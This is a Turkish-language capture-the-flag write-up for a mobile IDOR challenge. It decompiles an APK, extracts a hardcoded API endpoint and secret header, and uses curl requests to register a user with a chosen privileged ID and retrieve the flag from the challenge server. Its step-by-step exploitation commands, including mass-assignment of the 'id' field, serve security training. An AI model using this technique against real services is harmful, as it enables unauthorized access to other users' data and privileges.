# 📱 IDOR - Mobile Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Mobile-Challenge-darkblue?style=for-the-badge&logo=android" alt="Mobile">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-IDOR-purple?style=for-the-badge&logo=security" alt="IDOR">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Mobile  
**Seviye:** Orta  
**Puan:** 400

**Challenge Dosyası:** [📥 GitHub - app-release.apk](https://github.com/cihangungor/pitoctf/blob/main/app-release.apk)

---

## 🔍 Analiz

**Hedef:** Android APK dosyasında IDOR (Insecure Direct Object Reference) zafiyetini bulmak

**Strateji:** APK decompile → API analiz → IDOR vulnerability exploit

**IDOR Nedir?**
- Insecure Direct Object Reference
- Kullanıcının yetkisi olmayan verilere erişmesi
- ID, user_id gibi parametreleri değiştirerek başka kullanıcıların verilerine ulaşma

---

## ✅ Çözüm Adımları

### 📥 **1. APK İndirme ve İlk Analiz**

```bash
wget https://github.com/cihangungor/pitoctf/raw/main/app-release.apk
file app-release.apk
```

**Çıktı:**
```
app-release.apk: Android package (APK)
```

---

### 🔧 **2. APK Decompile (JADX)**

```bash
jadx -d output app-release.apk
cd output/sources
```

**Klasör yapısı:**
```
output/
├── resources/
└── sources/
    └── com/example/ctfchallenge/
        ├── MainActivity.java
        ├── ApiClient.java
        └── ApiResponse.java
```

---

### 📝 **3. MainActivity.java Analizi**

```java
private final void setupApiClient() {
    this.apiClient = new ApiClient(this, "https://64.226.74.243:5241");
}
```

**API Base URL bulundu:** `https://64.226.74.243:5241`

---

### 🔐 **4. ApiClient.java Analizi**

**Kritik bulgular:**

```java
public ApiClient(Context context, String baseUrl) {
    this.secretHeader = "X-Mob";
    this.secretValue = "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ";
    // ...
}

public final ApiResponse register(String username, String password) {
    // ...
    return executeRequest(new Request.Builder()
        .url(this.baseUrl + "/api/register")
        .addHeader(this.secretHeader, this.secretValue)
        .post(companion.create(string, this.JSON))
        .build());
}

public final ApiResponse getFlag(String username, String password) {
    // ...
    return executeRequest(new Request.Builder()
        .url(this.baseUrl + "/api/getFlag")
        .addHeader(this.secretHeader, this.secretValue)
        .post(companion.create(string, this.JSON))
        .build());
}
```

**Bulunanlar:**
- 📌 **Secret Header:** `X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ`
- 📌 **Endpoints:**
  - `/api/register` - Kullanıcı kaydı
  - `/api/getFlag` - Flag alma

**Fake flag decode:**
```bash
echo "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" | base64 -d
# Output: Flag{OkadarKolayDegil}
```

> ⚠️ Bu bir fake flag!

---

### 🌐 **5. API Test - İlk Denemeler**

#### **Test 1: Kullanıcı Kaydı**

```bash
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

**Response:**
```json
{
  "id": 0,
  "message": "Registration successful",
  "status": "success",
  "user": "testuser999"
}
```

✅ Kayıt başarılı! Kullanıcı **ID:0** aldı.

---

#### **Test 2: Flag Alma Denemesi**

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

**Response:**
```json
{
  "message": "Insufficient privileges. Regular users cannot access flags.",
  "status": "error"
}
```

❌ Normal kullanıcılar flag alamıyor!

---

### 🔓 **6. Admin Kullanıcı Araştırması**

#### **Test 3: Admin Kullanıcısı Bulma**

```bash
# Admin kullanıcısı var mı?
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"admin","password":"admin123"}'
```

**Response:**
```json
{
  "message": "Insufficient privileges. Regular users cannot access flags.",
  "status": "error"
}
```

✅ Admin kullanıcısı var ama o da flag alamıyor!

---

### 🎯 **7. IDOR Zafiyeti Keşfi**

**Hipotez:** Belki kayıt sırasında **ID parametresini manipüle** edebiliriz?

#### **Test 4: ID Manipulation**

```bash
# ID:999 ile kullanıcı oluştur
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123","id":999}'
```

**Response:**
```json
{
  "id": 999,
  "message": "Registration successful",
  "status": "success",
  "user": "hacker999"
}
```

🎉 **Başarılı!** ID:999 ile kullanıcı oluştu!

---

#### **Test 5: Privileged ID ile Flag Alma**

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123"}'
```

**Response:**
```json
{
  "flag": "CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}",
  "message": "Congratulations! You've solved the challenge!",
  "status": "success"
}
```

---

## 🚩 **FLAG**

```
CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">📦<br><b>JADX</b><br><sub>APK decompile</sub></td>
<td align="center">🌐<br><b>cURL</b><br><sub>API testing</sub></td>
<td align="center">🔍<br><b>strings</b><br><sub>Binary analysis</sub></td>
<td align="center">🐍<br><b>base64</b><br><sub>Decode</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# APK decompile
jadx -d output app-release.apk

# String analizi
strings classes.dex | grep -i "api"

# API test
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"user","password":"pass","id":999}'
```

---

## 💭 **Çözüm Akışı**

```
📱 Mobile APK Challenge
            ↓
📥 APK indirildi ve decompile edildi
            ↓
🔍 MainActivity.java → API URL bulundu
            ↓
🔐 ApiClient.java → Secret header bulundu
            ↓
🌐 API endpoint'leri keşfedildi
    - /api/register
    - /api/getFlag
            ↓
👤 Normal kullanıcı kaydı → ID:0 (yetki yok)
            ↓
🔓 Admin kullanıcısı bulundu (admin:admin123)
            ↓
❌ Admin bile flag alamıyor!
            ↓
💡 IDOR Hipotezi: ID manipülasyonu?
            ↓
🎯 Kayıt sırasında ID parametresi eklendi
            ↓
✅ ID:999 ile kullanıcı oluşturuldu
            ↓
🚩 FLAG: CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}
```
